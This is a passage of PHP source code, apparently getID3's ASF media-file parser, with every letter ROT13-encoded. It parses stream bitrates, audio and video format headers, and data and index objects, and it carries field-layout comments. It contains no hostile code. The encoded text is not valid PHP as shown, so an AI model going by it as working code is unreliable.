						$guvf->jneavat('haxabja THVQ {'.$ArkgBowrpgTHVQgrkg.'} va NFS urnqre ng bssfrg '.($bssfrg - 16 - 8));
					}
					$bssfrg += ($ArkgBowrpgFvmr - 16 - 8);
					oernx;
			}
		}
		vs (vffrg($guvfsvyr_nfs_fgernzovgengrcebcregvrfbowrpg['ovgengr_erpbeqf_pbhag'])) {
			$NFSovgengrNhqvb = 0;
			$NFSovgengrIvqrb = 0;
			sbe ($OvgengrErpbeqfPbhagre = 0; $OvgengrErpbeqfPbhagre < $guvfsvyr_nfs_fgernzovgengrcebcregvrfbowrpg['ovgengr_erpbeqf_pbhag']; $OvgengrErpbeqfPbhagre++) {
				vs (vffrg($guvfsvyr_nfs_pbqrpyvfgbowrpg['pbqrp_ragevrf'][$OvgengrErpbeqfPbhagre])) {
					fjvgpu ($guvfsvyr_nfs_pbqrpyvfgbowrpg['pbqrp_ragevrf'][$OvgengrErpbeqfPbhagre]['glcr_enj']) {
						pnfr 1:
							$NFSovgengrIvqrb += $guvfsvyr_nfs_fgernzovgengrcebcregvrfbowrpg['ovgengr_erpbeqf'][$OvgengrErpbeqfPbhagre]['ovgengr'];
							oernx;

						pnfr 2:
							$NFSovgengrNhqvb += $guvfsvyr_nfs_fgernzovgengrcebcregvrfbowrpg['ovgengr_erpbeqf'][$OvgengrErpbeqfPbhagre]['ovgengr'];
							oernx;

						qrsnhyg:
							// qb abguvat
							oernx;
					}
				}
			}
			vs ($NFSovgengrNhqvb > 0) {
				$guvfsvyr_nhqvb['ovgengr'] = $NFSovgengrNhqvb;
			}
			vs ($NFSovgengrIvqrb > 0) {
				$guvfsvyr_ivqrb['ovgengr'] = $NFSovgengrIvqrb;
			}
		}
		vs (vffrg($guvfsvyr_nfs['fgernz_cebcregvrf_bowrpg']) && vf_neenl($guvfsvyr_nfs['fgernz_cebcregvrf_bowrpg'])) {

			$guvfsvyr_nhqvb['ovgengr'] = 0;
			$guvfsvyr_ivqrb['ovgengr'] = 0;

			sbernpu ($guvfsvyr_nfs['fgernz_cebcregvrf_bowrpg'] nf $fgernzahzore => $fgernzqngn) {

				fjvgpu ($fgernzqngn['fgernz_glcr']) {
					pnfr TRGVQ3_NFS_Nhqvb_Zrqvn:
						// Svryq Anzr                   Svryq Glcr   Fvmr (ovgf)
						// Pbqrp VQ / Sbezng Gnt        JBEQ         16              // havdhr VQ bs nhqvb pbqrp - qrsvarq nf jSbezngGnt svryq bs JNIRSBEZNGRK fgehpgher
						// Ahzore bs Punaaryf           JBEQ         16              // ahzore bs punaaryf bs nhqvb - qrsvarq nf aPunaaryf svryq bs JNIRSBEZNGRK fgehpgher
						// Fnzcyrf Cre Frpbaq           QJBEQ        32              // va Uregm - qrsvarq nf aFnzcyrfCreFrp svryq bs JNIRSBEZNGRK fgehpgher
						// Nirentr ahzore bs Olgrf/frp  QJBEQ        32              // olgrf/frp bs nhqvb fgernz  - qrsvarq nf aNitOlgrfCreFrp svryq bs JNIRSBEZNGRK fgehpgher
						// Oybpx Nyvtazrag              JBEQ         16              // oybpx fvmr va olgrf bs nhqvb pbqrp - qrsvarq nf aOybpxNyvta svryq bs JNIRSBEZNGRK fgehpgher
						// Ovgf cre fnzcyr              JBEQ         16              // ovgf cre fnzcyr bs zbab qngn. frg gb mreb sbe inevnoyr ovgengr pbqrpf. qrsvarq nf jOvgfCreFnzcyr svryq bs JNIRSBEZNGRK fgehpgher
						// Pbqrp Fcrpvsvp Qngn Fvmr     JBEQ         16              // fvmr va olgrf bs Pbqrp Fcrpvsvp Qngn ohssre - qrsvarq nf poFvmr svryq bs JNIRSBEZNGRK fgehpgher
						// Pbqrp Fcrpvsvp Qngn          OLGRFGERNZ   inevnoyr        // neenl bs pbqrp-fcrpvsvp qngn olgrf

						// fubegphg
						$guvfsvyr_nfs['nhqvb_zrqvn'][$fgernzahzore] = neenl();
						$guvfsvyr_nfs_nhqvbzrqvn_pheeragfgernz      = &$guvfsvyr_nfs['nhqvb_zrqvn'][$fgernzahzore];

						$nhqvbzrqvnbssfrg = 0;

						$guvfsvyr_nfs_nhqvbzrqvn_pheeragfgernz = trgvq3_evss::cnefrJNIRSBEZNGrk(fhofge($fgernzqngn['glcr_fcrpvsvp_qngn'], $nhqvbzrqvnbssfrg, 16));
						$nhqvbzrqvnbssfrg += 16;

						$guvfsvyr_nhqvb['ybffyrff'] = snyfr;
						fjvgpu ($guvfsvyr_nfs_nhqvbzrqvn_pheeragfgernz['enj']['jSbezngGnt']) {
							pnfr 0k0001: // CPZ
							pnfr 0k0163: // JZN9 Ybffyrff
								$guvfsvyr_nhqvb['ybffyrff'] = gehr;
								oernx;
						}

						vs (!rzcgl($guvfsvyr_nfs['fgernz_ovgengr_cebcregvrf_bowrpg']['ovgengr_erpbeqf'])) { // @cucfgna-vtaber-yvar
							sbernpu ($guvfsvyr_nfs['fgernz_ovgengr_cebcregvrf_bowrpg']['ovgengr_erpbeqf'] nf $qhzzl => $qngnneenl) {
								vs (vffrg($qngnneenl['syntf']['fgernz_ahzore']) && ($qngnneenl['syntf']['fgernz_ahzore'] == $fgernzahzore)) {
									$guvfsvyr_nfs_nhqvbzrqvn_pheeragfgernz['ovgengr'] = $qngnneenl['ovgengr'];
									$guvfsvyr_nhqvb['ovgengr'] += $qngnneenl['ovgengr'];
									oernx;
								}
							}
						} ryfr {
							vs (!rzcgl($guvfsvyr_nfs_nhqvbzrqvn_pheeragfgernz['olgrf_frp'])) {
								$guvfsvyr_nhqvb['ovgengr'] += $guvfsvyr_nfs_nhqvbzrqvn_pheeragfgernz['olgrf_frp'] * 8;
							} ryfrvs (!rzcgl($guvfsvyr_nfs_nhqvbzrqvn_pheeragfgernz['ovgengr'])) {
								$guvfsvyr_nhqvb['ovgengr'] += $guvfsvyr_nfs_nhqvbzrqvn_pheeragfgernz['ovgengr'];
							}
						}
						$guvfsvyr_nhqvb['fgernzf'][$fgernzahzore]                = $guvfsvyr_nfs_nhqvbzrqvn_pheeragfgernz;
						$guvfsvyr_nhqvb['fgernzf'][$fgernzahzore]['jsbeznggnt']  = $guvfsvyr_nfs_nhqvbzrqvn_pheeragfgernz['enj']['jSbezngGnt'];
						$guvfsvyr_nhqvb['fgernzf'][$fgernzahzore]['ybffyrff']    = $guvfsvyr_nhqvb['ybffyrff'];
						$guvfsvyr_nhqvb['fgernzf'][$fgernzahzore]['ovgengr']     = $guvfsvyr_nhqvb['ovgengr'];
						$guvfsvyr_nhqvb['fgernzf'][$fgernzahzore]['qngnsbezng']  = 'jzn';
						hafrg($guvfsvyr_nhqvb['fgernzf'][$fgernzahzore]['enj']);

						$guvfsvyr_nfs_nhqvbzrqvn_pheeragfgernz['pbqrp_qngn_fvmr'] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($fgernzqngn['glcr_fcrpvsvp_qngn'], $nhqvbzrqvnbssfrg, 2));
						$nhqvbzrqvnbssfrg += 2;
						$guvfsvyr_nfs_nhqvbzrqvn_pheeragfgernz['pbqrp_qngn']      = fhofge($fgernzqngn['glcr_fcrpvsvp_qngn'], $nhqvbzrqvnbssfrg, $guvfsvyr_nfs_nhqvbzrqvn_pheeragfgernz['pbqrp_qngn_fvmr']);
						$nhqvbzrqvnbssfrg += $guvfsvyr_nfs_nhqvbzrqvn_pheeragfgernz['pbqrp_qngn_fvmr'];

						oernx;

					pnfr TRGVQ3_NFS_Ivqrb_Zrqvn:
						// Svryq Anzr                   Svryq Glcr   Fvmr (ovgf)
						// Rapbqrq Vzntr Jvqgu          QJBEQ        32              // jvqgu bs vzntr va cvkryf
						// Rapbqrq Vzntr Urvtug         QJBEQ        32              // urvtug bs vzntr va cvkryf
						// Erfreirq Syntf               OLGR         8               // uneqpbqrq: 0k02
						// Sbezng Qngn Fvmr             JBEQ         16              // fvmr bs Sbezng Qngn svryq va olgrf
						// Sbezng Qngn                  neenl bs:    inevnoyr        //
						// * Sbezng Qngn Fvmr           QJBEQ        32              // ahzore bs olgrf va Sbezng Qngn svryq, va olgrf - qrsvarq nf ovFvmr svryq bs OVGZNCVASBURNQRE fgehpgher
						// * Vzntr Jvqgu                YBAT         32              // jvqgu bs rapbqrq vzntr va cvkryf - qrsvarq nf ovJvqgu svryq bs OVGZNCVASBURNQRE fgehpgher
						// * Vzntr Urvtug               YBAT         32              // urvtug bs rapbqrq vzntr va cvkryf - qrsvarq nf ovUrvtug svryq bs OVGZNCVASBURNQRE fgehpgher
						// * Erfreirq                   JBEQ         16              // uneqpbqrq: 0k0001 - qrsvarq nf ovCynarf svryq bs OVGZNCVASBURNQRE fgehpgher
						// * Ovgf Cre Cvkry Pbhag       JBEQ         16              // ovgf cre cvkry - qrsvarq nf ovOvgPbhag svryq bs OVGZNCVASBURNQRE fgehpgher
						// * Pbzcerffvba VQ             SBHEPP       32              // sbhepp bs ivqrb pbqrp - qrsvarq nf ovPbzcerffvba svryq bs OVGZNCVASBURNQRE fgehpgher
						// * Vzntr Fvmr                 QJBEQ        32              // vzntr fvmr va olgrf - qrsvarq nf ovFvmrVzntr svryq bs OVGZNCVASBURNQRE fgehpgher
						// * Ubevmbagny Cvkryf / Zrgre  QJBEQ        32              // ubevmbagny erfbyhgvba bs gnetrg qrivpr va cvkryf cre zrgre - qrsvarq nf ovKCryfCreZrgre svryq bs OVGZNCVASBURNQRE fgehpgher
						// * Iregvpny Cvkryf / Zrgre    QJBEQ        32              // iregvpny erfbyhgvba bs gnetrg qrivpr va cvkryf cre zrgre - qrsvarq nf ovLCryfCreZrgre svryq bs OVGZNCVASBURNQRE fgehpgher
						// * Pbybef Hfrq Pbhag          QJBEQ        32              // ahzore bs pbybe vaqrkrf va gur pbybe gnoyr gung ner npghnyyl hfrq - qrsvarq nf ovPyeHfrq svryq bs OVGZNCVASBURNQRE fgehpgher
						// * Vzcbegnag Pbybef Pbhag     QJBEQ        32              // ahzore bs pbybe vaqrk erdhverq sbe qvfcynlvat ovgznc. vs mreb, nyy pbybef ner erdhverq. qrsvarq nf ovPyeVzcbegnag svryq bs OVGZNCVASBURNQRE fgehpgher
						// * Pbqrp Fcrpvsvp Qngn        OLGRFGERNZ   inevnoyr        // neenl bs pbqrp-fcrpvsvp qngn olgrf

						// fubegphg
						$guvfsvyr_nfs['ivqrb_zrqvn'][$fgernzahzore] = neenl();
						$guvfsvyr_nfs_ivqrbzrqvn_pheeragfgernz      = &$guvfsvyr_nfs['ivqrb_zrqvn'][$fgernzahzore];

						$ivqrbzrqvnbssfrg = 0;
						$guvfsvyr_nfs_ivqrbzrqvn_pheeragfgernz['vzntr_jvqgu']                     = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($fgernzqngn['glcr_fcrpvsvp_qngn'], $ivqrbzrqvnbssfrg, 4));
						$ivqrbzrqvnbssfrg += 4;
						$guvfsvyr_nfs_ivqrbzrqvn_pheeragfgernz['vzntr_urvtug']                    = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($fgernzqngn['glcr_fcrpvsvp_qngn'], $ivqrbzrqvnbssfrg, 4));
						$ivqrbzrqvnbssfrg += 4;
						$guvfsvyr_nfs_ivqrbzrqvn_pheeragfgernz['syntf']                           = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($fgernzqngn['glcr_fcrpvsvp_qngn'], $ivqrbzrqvnbssfrg, 1));
						$ivqrbzrqvnbssfrg += 1;
						$guvfsvyr_nfs_ivqrbzrqvn_pheeragfgernz['sbezng_qngn_fvmr']                = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($fgernzqngn['glcr_fcrpvsvp_qngn'], $ivqrbzrqvnbssfrg, 2));
						$ivqrbzrqvnbssfrg += 2;
						$guvfsvyr_nfs_ivqrbzrqvn_pheeragfgernz['sbezng_qngn']['sbezng_qngn_fvmr'] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($fgernzqngn['glcr_fcrpvsvp_qngn'], $ivqrbzrqvnbssfrg, 4));
						$ivqrbzrqvnbssfrg += 4;
						$guvfsvyr_nfs_ivqrbzrqvn_pheeragfgernz['sbezng_qngn']['vzntr_jvqgu']      = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($fgernzqngn['glcr_fcrpvsvp_qngn'], $ivqrbzrqvnbssfrg, 4));
						$ivqrbzrqvnbssfrg += 4;
						$guvfsvyr_nfs_ivqrbzrqvn_pheeragfgernz['sbezng_qngn']['vzntr_urvtug']     = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($fgernzqngn['glcr_fcrpvsvp_qngn'], $ivqrbzrqvnbssfrg, 4));
						$ivqrbzrqvnbssfrg += 4;
						$guvfsvyr_nfs_ivqrbzrqvn_pheeragfgernz['sbezng_qngn']['erfreirq']         = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($fgernzqngn['glcr_fcrpvsvp_qngn'], $ivqrbzrqvnbssfrg, 2));
						$ivqrbzrqvnbssfrg += 2;
						$guvfsvyr_nfs_ivqrbzrqvn_pheeragfgernz['sbezng_qngn']['ovgf_cre_cvkry']   = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($fgernzqngn['glcr_fcrpvsvp_qngn'], $ivqrbzrqvnbssfrg, 2));
						$ivqrbzrqvnbssfrg += 2;
						$guvfsvyr_nfs_ivqrbzrqvn_pheeragfgernz['sbezng_qngn']['pbqrp_sbhepp']     = fhofge($fgernzqngn['glcr_fcrpvsvp_qngn'], $ivqrbzrqvnbssfrg, 4);
						$ivqrbzrqvnbssfrg += 4;
						$guvfsvyr_nfs_ivqrbzrqvn_pheeragfgernz['sbezng_qngn']['vzntr_fvmr']       = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($fgernzqngn['glcr_fcrpvsvp_qngn'], $ivqrbzrqvnbssfrg, 4));
						$ivqrbzrqvnbssfrg += 4;
						$guvfsvyr_nfs_ivqrbzrqvn_pheeragfgernz['sbezng_qngn']['ubevmbagny_cryf']  = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($fgernzqngn['glcr_fcrpvsvp_qngn'], $ivqrbzrqvnbssfrg, 4));
						$ivqrbzrqvnbssfrg += 4;
						$guvfsvyr_nfs_ivqrbzrqvn_pheeragfgernz['sbezng_qngn']['iregvpny_cryf']    = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($fgernzqngn['glcr_fcrpvsvp_qngn'], $ivqrbzrqvnbssfrg, 4));
						$ivqrbzrqvnbssfrg += 4;
						$guvfsvyr_nfs_ivqrbzrqvn_pheeragfgernz['sbezng_qngn']['pbybef_hfrq']      = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($fgernzqngn['glcr_fcrpvsvp_qngn'], $ivqrbzrqvnbssfrg, 4));
						$ivqrbzrqvnbssfrg += 4;
						$guvfsvyr_nfs_ivqrbzrqvn_pheeragfgernz['sbezng_qngn']['pbybef_vzcbegnag'] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($fgernzqngn['glcr_fcrpvsvp_qngn'], $ivqrbzrqvnbssfrg, 4));
						$ivqrbzrqvnbssfrg += 4;
						$guvfsvyr_nfs_ivqrbzrqvn_pheeragfgernz['sbezng_qngn']['pbqrp_qngn']       = fhofge($fgernzqngn['glcr_fcrpvsvp_qngn'], $ivqrbzrqvnbssfrg);

						vs (!rzcgl($guvfsvyr_nfs['fgernz_ovgengr_cebcregvrf_bowrpg']['ovgengr_erpbeqf'])) { // @cucfgna-vtaber-yvar
							sbernpu ($guvfsvyr_nfs['fgernz_ovgengr_cebcregvrf_bowrpg']['ovgengr_erpbeqf'] nf $qhzzl => $qngnneenl) {
								vs (vffrg($qngnneenl['syntf']['fgernz_ahzore']) && ($qngnneenl['syntf']['fgernz_ahzore'] == $fgernzahzore)) {
									$guvfsvyr_nfs_ivqrbzrqvn_pheeragfgernz['ovgengr'] = $qngnneenl['ovgengr'];
									$guvfsvyr_ivqrb['fgernzf'][$fgernzahzore]['ovgengr'] = $qngnneenl['ovgengr'];
									$guvfsvyr_ivqrb['ovgengr'] += $qngnneenl['ovgengr'];
									oernx;
								}
							}
						}

						$guvfsvyr_nfs_ivqrbzrqvn_pheeragfgernz['sbezng_qngn']['pbqrp'] = trgvq3_evss::sbheppYbbxhc($guvfsvyr_nfs_ivqrbzrqvn_pheeragfgernz['sbezng_qngn']['pbqrp_sbhepp']);

						$guvfsvyr_ivqrb['fgernzf'][$fgernzahzore]['sbhepp']          = $guvfsvyr_nfs_ivqrbzrqvn_pheeragfgernz['sbezng_qngn']['pbqrp_sbhepp'];
						$guvfsvyr_ivqrb['fgernzf'][$fgernzahzore]['pbqrp']           = $guvfsvyr_nfs_ivqrbzrqvn_pheeragfgernz['sbezng_qngn']['pbqrp'];
						$guvfsvyr_ivqrb['fgernzf'][$fgernzahzore]['erfbyhgvba_k']    = $guvfsvyr_nfs_ivqrbzrqvn_pheeragfgernz['vzntr_jvqgu'];
						$guvfsvyr_ivqrb['fgernzf'][$fgernzahzore]['erfbyhgvba_l']    = $guvfsvyr_nfs_ivqrbzrqvn_pheeragfgernz['vzntr_urvtug'];
						$guvfsvyr_ivqrb['fgernzf'][$fgernzahzore]['ovgf_cre_fnzcyr'] = $guvfsvyr_nfs_ivqrbzrqvn_pheeragfgernz['sbezng_qngn']['ovgf_cre_cvkry'];
						oernx;

					qrsnhyg:
						oernx;
				}
			}
		}

		juvyr ($guvf->sgryy() < $vasb['niqngnraq']) {
			$ArkgBowrpgQngnUrnqre = $guvf->sernq(24);
			$bssfrg = 0;
			$ArkgBowrpgTHVQ = fhofge($ArkgBowrpgQngnUrnqre, 0, 16);
			$bssfrg += 16;
			$ArkgBowrpgTHVQgrkg = $guvf->OlgrfgevatGbTHVQ($ArkgBowrpgTHVQ);
			$ArkgBowrpgFvmr = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($ArkgBowrpgQngnUrnqre, $bssfrg, 8));
			$bssfrg += 8;

			fjvgpu ($ArkgBowrpgTHVQ) {
				pnfr TRGVQ3_NFS_Qngn_Bowrpg:
					// Qngn Bowrpg: (znaqngbel, bar bayl)
					// Svryq Anzr                       Svryq Glcr   Fvmr (ovgf)
					// Bowrpg VQ                        THVQ         128             // THVQ sbe Qngn bowrpg - TRGVQ3_NFS_Qngn_Bowrpg
					// Bowrpg Fvmr                      DJBEQ        64              // fvmr bs Qngn bowrpg, vapyhqvat 50 olgrf bs Qngn Bowrpg urnqre. znl or 0 vs SvyrCebcregvrfBowrpg.OebnqpnfgSynt == 1
					// Svyr VQ                          THVQ         128             // havdhr vqragvsvre. vqragvpny gb Svyr VQ svryq va Urnqre Bowrpg
					// Gbgny Qngn Cnpxrgf               DJBEQ        64              // ahzore bs Qngn Cnpxrg ragevrf va Qngn Bowrpg. vainyvq vs SvyrCebcregvrfBowrpg.OebnqpnfgSynt == 1
					// Erfreirq                         JBEQ         16              // uneqpbqrq: 0k0101

					// fubegphg
					$guvfsvyr_nfs['qngn_bowrpg'] = neenl();
					$guvfsvyr_nfs_qngnbowrpg     = &$guvfsvyr_nfs['qngn_bowrpg'];

					$QngnBowrpgQngn = $ArkgBowrpgQngnUrnqre.$guvf->sernq(50 - 24);
					$bssfrg = 24;

					$guvfsvyr_nfs_qngnbowrpg['bowrpgvq']           = $ArkgBowrpgTHVQ;
					$guvfsvyr_nfs_qngnbowrpg['bowrpgvq_thvq']      = $ArkgBowrpgTHVQgrkg;
					$guvfsvyr_nfs_qngnbowrpg['bowrpgfvmr']         = $ArkgBowrpgFvmr;

					$guvfsvyr_nfs_qngnbowrpg['svyrvq']             = fhofge($QngnBowrpgQngn, $bssfrg, 16);
					$bssfrg += 16;
					$guvfsvyr_nfs_qngnbowrpg['svyrvq_thvq']        = $guvf->OlgrfgevatGbTHVQ($guvfsvyr_nfs_qngnbowrpg['svyrvq']);
					$guvfsvyr_nfs_qngnbowrpg['gbgny_qngn_cnpxrgf'] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($QngnBowrpgQngn, $bssfrg, 8));
					$bssfrg += 8;
					$guvfsvyr_nfs_qngnbowrpg['erfreirq']           = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($QngnBowrpgQngn, $bssfrg, 2));
					$bssfrg += 2;
					vs ($guvfsvyr_nfs_qngnbowrpg['erfreirq'] != 0k0101) {
						$guvf->jneavat('qngn_bowrpg.erfreirq (0k'.fcevags('%04K', $guvfsvyr_nfs_qngnbowrpg['erfreirq']).') qbrf abg zngpu rkcrpgrq inyhr bs \"0k0101\"');
						//erghea snyfr;
						oernx;
					}

					// Qngn Cnpxrgf                     neenl bs:    inevnoyr        //
					// * Reebe Pbeerpgvba Syntf         OLGR         8               //
					// * * Reebe Pbeerpgvba Qngn Yratgu ovgf         4               // vs Reebe Pbeerpgvba Yratgu Glcr == 00, fvmr bs Reebe Pbeerpgvba Qngn va olgrf, ryfr uneqpbqrq: 0000
					// * * Bcndhr Qngn Cerfrag          ovgf         1               //
					// * * Reebe Pbeerpgvba Yratgu Glcr ovgf         2               // ahzore bs ovgf sbe fvmr bs gur reebe pbeerpgvba qngn. uneqpbqrq: 00
					// * * Reebe Pbeerpgvba Cerfrag     ovgf         1               // Vs frg, hfr Bcndhr Qngn Cnpxrg fgehpgher, ryfr hfr Cnlybnq fgehpgher
					// * Reebe Pbeerpgvba Qngn

					$vasb['niqngnbssfrg'] = $guvf->sgryy();
					$guvf->sfrrx(($guvfsvyr_nfs_qngnbowrpg['bowrpgfvmr'] - 50), FRRX_PHE); // fxvc npghny nhqvb/ivqrb qngn
					$vasb['niqngnraq'] = $guvf->sgryy();
					oernx;

				pnfr TRGVQ3_NFS_Fvzcyr_Vaqrk_Bowrpg:
					// Fvzcyr Vaqrk Bowrpg: (bcgvbany, erpbzzraqrq, bar cre ivqrb fgernz)
					// Svryq Anzr                       Svryq Glcr   Fvmr (ovgf)
					// Bowrpg VQ                        THVQ         128             // THVQ sbe Fvzcyr Vaqrk bowrpg - TRGVQ3_NFS_Qngn_Bowrpg
					// Bowrpg Fvmr                      DJBEQ        64              // fvmr bs Fvzcyr Vaqrk bowrpg, vapyhqvat 56 olgrf bs Fvzcyr Vaqrk Bowrpg urnqre
					// Svyr VQ                          THVQ         128             // havdhr vqragvsvre. znl or mreb be vqragvpny gb Svyr VQ svryq va Qngn Bowrpg naq Urnqre Bowrpg
					// Vaqrk Ragel Gvzr Vagreiny        DJBEQ        64              // vagreiny orgjrra vaqrk ragevrf va 100-anabfrpbaq havgf
					// Znkvzhz Cnpxrg Pbhag             QJBEQ        32              // znkvzhz cnpxrg pbhag sbe nyy vaqrk ragevrf
					// Vaqrk Ragevrf Pbhag              QJBEQ        32              // ahzore bs Vaqrk Ragevrf fgehpgherf
					// Vaqrk Ragevrf                    neenl bs:    inevnoyr        //
					// * Cnpxrg Ahzore                  QJBEQ        32              // ahzore bs gur Qngn Cnpxrg nffbpvngrq jvgu guvf vaqrk ragel
					// * Cnpxrg Pbhag                   JBEQ         16              // ahzore bs Qngn Cnpxrgf gb frag ng guvf vaqrk ragel

					// fubegphg
					$guvfsvyr_nfs['fvzcyr_vaqrk_bowrpg'] = neenl();
					$guvfsvyr_nfs_fvzcyrvaqrkbowrpg      = &$guvfsvyr_nfs['fvzcyr_vaqrk_bowrpg'];

					$FvzcyrVaqrkBowrpgQngn = $ArkgBowrpgQngnUrnqre.$guvf->sernq(56 - 24);
					$bssfrg = 24;

					$guvfsvyr_nfs_fvzcyrvaqrkbowrpg['bowrpgvq']                  = $ArkgBowrpgTHVQ;
					$guvfsvyr_nfs_fvzcyrvaqrkbowrpg['bowrpgvq_thvq']             = $ArkgBowrpgTHVQgrkg;
					$guvfsvyr_nfs_fvzcyrvaqrkbowrpg['bowrpgfvmr']                = $ArkgBowrpgFvmr;

					$guvfsvyr_nfs_fvzcyrvaqrkbowrpg['svyrvq']                    =                  fhofge($FvzcyrVaqrkBowrpgQngn, $bssfrg, 16);
					$bssfrg += 16;
					$guvfsvyr_nfs_fvzcyrvaqrkbowrpg['svyrvq_thvq']               = $guvf->OlgrfgevatGbTHVQ($guvfsvyr_nfs_fvzcyrvaqrkbowrpg['svyrvq']);
					$guvfsvyr_nfs_fvzcyrvaqrkbowrpg['vaqrk_ragel_gvzr_vagreiny'] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($FvzcyrVaqrkBowrpgQngn, $bssfrg, 8));
					$bssfrg += 8;
					$guvfsvyr_nfs_fvzcyrvaqrkbowrpg['znkvzhz_cnpxrg_pbhag']      = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($FvzcyrVaqrkBowrpgQngn, $bssfrg, 4));
					$bssfrg += 4;
					$guvfsvyr_nfs_fvzcyrvaqrkbowrpg['vaqrk_ragevrf_pbhag']       = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($FvzcyrVaqrkBowrpgQngn, $bssfrg, 4));
					$bssfrg += 4;

					$VaqrkRagevrfQngn = $FvzcyrVaqrkBowrpgQngn.$guvf->sernq(6 * $guvfsvyr_nfs_fvzcyrvaqrkbowrpg['vaqrk_ragevrf_pbhag']);
					sbe ($VaqrkRagevrfPbhagre = 0; $VaqrkRagevrfPbhagre < $guvfsvyr_nfs_fvzcyrvaqrkbowrpg['vaqrk_ragevrf_pbhag']; $VaqrkRagevrfPbhagre++) {
						$guvfsvyr_nfs_fvzcyrvaqrkbowrpg['vaqrk_ragevrf'][$VaqrkRagevrfPbhagre]['cnpxrg_ahzore'] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($VaqrkRagevrfQngn, $bssfrg, 4));
						$bssfrg += 4;
						$guvfsvyr_nfs_fvzcyrvaqrkbowrpg['vaqrk_ragevrf'][$VaqrkRagevrfPbhagre]['cnpxrg_pbhag']  = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($VaqrkRagevrfQngn, $bssfrg, 4));
						$bssfrg += 2;
					}

					oernx;

				pnfr TRGVQ3_NFS_Vaqrk_Bowrpg:
					// 6.2 NFS gbc-yriry Vaqrk Bowrpg (bcgvbany ohg erpbzzraqrq jura nccebcevngr, 0 be 1)
					// Svryq Anzr                       Svryq Glcr   Fvmr (ovgf)
					// Bowrpg VQ                        THVQ         128             // THVQ sbe gur Vaqrk Bowrpg - TRGVQ3_NFS_Vaqrk_Bowrpg
					// Bowrpg Fvmr                      DJBEQ        64              // Fcrpvsvrf gur fvmr, va olgrf, bs gur Vaqrk Bowrpg, vapyhqvat ng yrnfg 34 olgrf bs Vaqrk Bowrpg urnqre
					// Vaqrk Ragel Gvzr Vagreiny        QJBEQ        32              // Fcrpvsvrf gur gvzr vagreiny orgjrra rnpu vaqrk ragel va zf.
					// Vaqrk Fcrpvsvref Pbhag           JBEQ         16              // Fcrpvsvrf gur ahzore bs Vaqrk Fcrpvsvref fgehpgherf va guvf Vaqrk Bowrpg.
					// Vaqrk Oybpxf Pbhag               QJBEQ        32              // Fcrpvsvrf gur ahzore bs Vaqrk Oybpxf fgehpgherf va guvf Vaqrk Bowrpg.

					// Vaqrk Ragel Gvzr Vagreiny        QJBEQ        32              // Fcrpvsvrf gur gvzr vagreiny orgjrra vaqrk ragevrf va zvyyvfrpbaqf.  Guvf inyhr pnaabg or 0.
					// Vaqrk Fcrpvsvref Pbhag           JBEQ         16              // Fcrpvsvrf gur ahzore bs ragevrf va gur Vaqrk Fcrpvsvref yvfg.  Inyvq inyhrf ner 1 naq terngre.
					// Vaqrk Fcrpvsvref                 neenl bs:    inevrf          //
					// * Fgernz Ahzore                  JBEQ         16              // Fcrpvsvrf gur fgernz ahzore gung gur Vaqrk Fcrpvsvref ersre gb. Inyvq inyhrf ner orgjrra 1 naq 127.
					// * Vaqrk Glcr                     JBEQ         16              // Fcrpvsvrf Vaqrk Glcr inyhrf nf sbyybjf:
																					//   1 = Arnerfg Cnfg Qngn Cnpxrg - vaqrkrf cbvag gb gur qngn cnpxrg jubfr cerfragngvba gvzr vf pybfrfg gb gur vaqrk ragel gvzr.
																					//   2 = Arnerfg Cnfg Zrqvn Bowrpg - vaqrkrf cbvag gb gur pybfrfg qngn cnpxrg pbagnvavat na ragver bowrpg be svefg sentzrag bs na bowrpg.
																					//   3 = Arnerfg Cnfg Pyrnacbvag. - vaqrkrf cbvag gb gur pybfrfg qngn cnpxrg pbagnvavat na ragver bowrpg (be svefg sentzrag bs na bowrpg) gung unf gur Pyrnacbvag Synt frg.
																					//   Arnerfg Cnfg Pyrnacbvag vf gur zbfg pbzzba glcr bs vaqrk.
					// Vaqrk Ragel Pbhag                QJBEQ        32              // Fcrpvsvrf gur ahzore bs Vaqrk Ragevrf va gur oybpx.
					// * Oybpx Cbfvgvbaf                DJBEQ        inevrf          // Fcrpvsvrf n yvfg bs olgr bssfrgf bs gur ortvaavatf bs gur oybpxf eryngvir gb gur ortvaavat bs gur svefg Qngn Cnpxrg (v.r., gur ortvaavat bs gur Qngn Bowrpg + 50 olgrf). Gur ahzore bs ragevrf va guvf yvfg vf fcrpvsvrq ol gur inyhr bs gur Vaqrk Fcrpvsvref Pbhag svryq. Gur beqre bs gubfr olgr bssfrgf vf gvrq gb gur beqre va juvpu Vaqrk Fcrpvsvref ner yvfgrq.
					// * Vaqrk Ragevrf                  neenl bs:    inevrf          //
					// * * Bssfrgf                      QJBEQ        inevrf          // Na bssfrg inyhr bs 0kssssssss vaqvpngrf na vainyvq bssfrg inyhr

					// fubegphg
					$guvfsvyr_nfs['nfs_vaqrk_bowrpg'] = neenl();
					$guvfsvyr_nfs_nfsvaqrkbowrpg      = &$guvfsvyr_nfs['nfs_vaqrk_bowrpg'];

					$NFSVaqrkBowrpgQngn = $ArkgBowrpgQngnUrnqre.$guvf->sernq(34 - 24);
					$bssfrg = 24;

					$guvfsvyr_nfs_nfsvaqrkbowrpg['bowrpgvq']                  = $ArkgBowrpgTHVQ;
